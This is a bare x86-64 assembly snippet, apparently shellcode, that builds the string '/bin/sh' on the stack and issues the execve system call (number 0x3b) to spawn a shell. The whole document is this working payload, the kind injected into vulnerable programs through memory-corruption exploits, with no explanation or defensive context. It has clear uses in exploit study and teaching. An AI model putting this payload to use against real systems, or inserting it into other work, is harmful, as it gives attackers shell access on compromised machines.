xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f ; /bin/sh
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall